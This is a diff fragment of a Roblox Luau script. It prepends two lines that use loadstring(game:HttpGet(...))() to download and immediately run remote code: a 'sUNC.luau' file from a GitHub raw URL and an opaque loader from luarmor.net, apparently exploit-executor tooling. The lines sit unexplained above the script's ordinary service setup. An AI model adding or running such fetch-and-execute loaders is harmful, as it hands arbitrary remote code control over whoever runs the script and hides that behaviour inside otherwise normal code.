@@ -1,3 +1,8 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/azureblueday/starscripts/refs/heads/main/sUNC.luau"))()
+task.wait(2)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/09145a2bdbe6ba7b93631069634fcf4a.lua"))()
+task.wait(1)
+
 --<< Services >>--
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
